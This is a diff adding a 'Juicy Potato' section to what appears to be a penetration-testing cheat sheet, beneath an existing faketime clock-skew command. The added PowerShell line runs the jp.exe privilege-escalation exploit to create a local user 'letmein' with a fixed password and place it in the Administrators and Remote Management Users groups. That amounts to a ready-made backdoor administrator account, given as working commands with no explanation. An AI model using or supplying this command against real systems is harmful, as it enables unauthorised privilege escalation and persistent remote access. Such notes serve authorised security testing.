@@ -108,3 +108,11 @@ Calculate the hour (without nmap)
 ```bash
 faketime -f +{SKEW}h {command}
 ```
+
+## Potatoes
+
+### Juicy Potato
+
+```powershell
+.\jp.exe -t * -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c net user letmein Password123! /add && net localgroup administrators letmein /add && net localgroup \"Remote Management Users\" letmein /add"
+```
